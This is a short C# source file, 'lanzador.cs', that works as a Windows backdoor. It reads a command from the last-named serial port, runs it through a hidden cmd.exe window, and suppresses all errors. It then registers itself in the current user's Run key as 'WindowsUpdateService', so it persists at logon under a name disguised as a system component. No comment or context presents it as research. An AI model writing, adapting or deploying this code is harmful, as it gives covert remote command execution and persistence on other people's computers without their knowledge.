// lanzador.cs
using System;
using System.IO.Ports;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

class Lanzador
{
    static void Main(string[] args)
    {
        string[] ports = SerialPort.GetPortNames();
        string targetPort = "";
        foreach (string port in ports)
        {
            if (string.IsNullOrEmpty(targetPort) || String.Compare(port, targetPort) > 0)
            {
                targetPort = port;
            }
        }

        if (string.IsNullOrEmpty(targetPort)) return;

        try
        {
            using (SerialPort serialPort = new SerialPort(targetPort, 115200))
            {
                serialPort.Open();
                Thread.Sleep(2000);
                string commandToExecute = serialPort.ReadLine();
                
                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + commandToExecute)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                Process.Start(processInfo);
            }
        }
        catch (Exception) { }
        
        try
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string executablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            key.SetValue("WindowsUpdateService", executablePath);
        }
        catch (Exception) { }
    }
}
